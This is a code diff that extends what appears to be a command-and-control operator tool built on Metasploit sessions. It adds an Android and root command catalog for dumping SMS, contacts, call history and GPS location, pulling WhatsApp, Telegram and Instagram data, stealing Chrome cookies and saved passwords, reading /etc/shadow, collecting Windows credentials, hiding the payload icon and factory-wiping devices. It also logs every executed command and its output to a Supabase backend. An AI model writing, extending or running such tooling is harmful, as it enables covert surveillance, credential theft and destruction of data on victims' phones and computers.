@@ -110,6 +110,30 @@ const COMMAND_CATALOG: C2Command[] = [
   { id: "download_all", name: "download", category: "Exfil", description: "Download file", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\secret.txt" },
   { id: "upload_file", name: "upload", category: "Exfil", description: "Upload file to target", needsParam: true, paramLabel: "src dst", paramPlaceholder: "/tmp/backdoor.exe C:\\target.exe" },
   { id: "screenshot_exfil", name: "screenshot", category: "Exfil", description: "Take and download screenshot" },
+
+  // ── Root / Android ──────────────────────────────────────────────────────────
+  { id: "android_root_check",   name: "run post/multi/manage/shell_to_meterpreter", category: "Root", description: "Upgrade shell to Meterpreter (Android)" },
+  { id: "android_dump_sms",     name: "dump_sms",      category: "Root", description: "Dump all SMS messages" },
+  { id: "android_dump_contacts",name: "dump_contacts", category: "Root", description: "Dump contact list" },
+  { id: "android_dump_calllog", name: "dump_calllog",  category: "Root", description: "Dump call history" },
+  { id: "android_geo",          name: "geolocate",     category: "Root", description: "Get GPS coordinates" },
+  { id: "android_wipe",         name: "wipe",          category: "Root", description: "Factory wipe device (root)" },
+  { id: "android_set_audio",    name: "set_audio_mode -m 0", category: "Root", description: "Set audio to silent" },
+  { id: "android_hide_app",     name: "hide_app_icon", category: "Root", description: "Hide payload icon from launcher" },
+  { id: "whatsapp_db",          name: "run post/android/capture/app_data -p com.whatsapp",   category: "Root", description: "Pull WhatsApp database (root)", needsParam: false },
+  { id: "telegram_db",          name: "run post/android/capture/app_data -p org.telegram.messenger", category: "Root", description: "Pull Telegram database (root)" },
+  { id: "instagram_cookies",    name: "run post/android/capture/app_data -p com.instagram.android",  category: "Root", description: "Pull Instagram session cookies (root)" },
+  { id: "chrome_cookies",       name: "run post/multi/gather/chrome_cookies",                         category: "Root", description: "Steal Chrome cookies (no root needed)" },
+  { id: "chrome_passwords",     name: "run post/multi/gather/chrome_passwords",                       category: "Root", description: "Steal Chrome saved passwords" },
+  { id: "chrome_history",       name: "run post/multi/gather/chrome_local_data",                      category: "Root", description: "Dump Chrome browsing history" },
+  { id: "root_getsystem",       name: "getsystem",           category: "Root", description: "Escalate to root/SYSTEM" },
+  { id: "root_shell",           name: "execute -f /bin/sh -i -H", category: "Root", description: "Spawn root shell" },
+  { id: "root_sudoers",         name: "cat /etc/sudoers",    category: "Root", description: "Read sudoers file" },
+  { id: "root_shadow",          name: "cat /etc/shadow",     category: "Root", description: "Dump password hashes (/etc/shadow)" },
+  { id: "root_wifi_passwords",  name: "run post/linux/gather/wifi_credentials",  category: "Root", description: "Dump WiFi passwords (Linux root)" },
+  { id: "win_browser_creds",    name: "run post/windows/gather/credentials/credential_collector", category: "Root", description: "Collect all Windows browser credentials" },
+  { id: "win_tokens",           name: "use incognito && list_tokens -u", category: "Root", description: "List impersonation tokens" },
+  { id: "win_clipboard_full",   name: "run post/windows/gather/clipboard",       category: "Root", description: "Full clipboard history grab" },
 ];
 
 export function getCommandsByCategory(): Record<string, C2Command[]> {
@@ -209,6 +233,7 @@ export async function executeC2Command(
   sessionId: number,
   commandId: string,
   param?: string,
+  deviceId?: string,
 ): Promise<C2Result> {
   const cmd = getCommand(commandId);
   if (!cmd) {
@@ -220,14 +245,38 @@ export async function executeC2Command(
     fullCommand = `${cmd.name} ${param}`;
   }
 
-  return rawSessionCommand(sessionId, fullCommand);
+  const result = await rawSessionCommand(sessionId, fullCommand);
+
+  // Log to Supabase (fire-and-forget, never blocks the response)
+  if (deviceId) {
+    import("../supabase").then(({ logCommand, queueOffline }) => {
+      logCommand(deviceId, sessionId, fullCommand, result.output, result.success, commandId)
+        .catch(() =>
+          queueOffline("command", { device_id: deviceId, session_id: sessionId, command: fullCommand, output: result.output, success: result.success, command_id: commandId })
+        );
+    }).catch(() => {});
+  }
+
+  return result;
 }
 
 export async function executeCustomCommand(
   sessionId: number,
   command: string,
+  deviceId?: string,
 ): Promise<C2Result> {
-  return rawSessionCommand(sessionId, command);
+  const result = await rawSessionCommand(sessionId, command);
+
+  if (deviceId) {
+    import("../supabase").then(({ logCommand, queueOffline }) => {
+      logCommand(deviceId, sessionId, command, result.output, result.success)
+        .catch(() =>
+          queueOffline("command", { device_id: deviceId, session_id: sessionId, command, output: result.output, success: result.success })
+        );
+    }).catch(() => {});
+  }
+
+  return result;
 }
 
 // ── List active sessions ─────────────────────────────────────
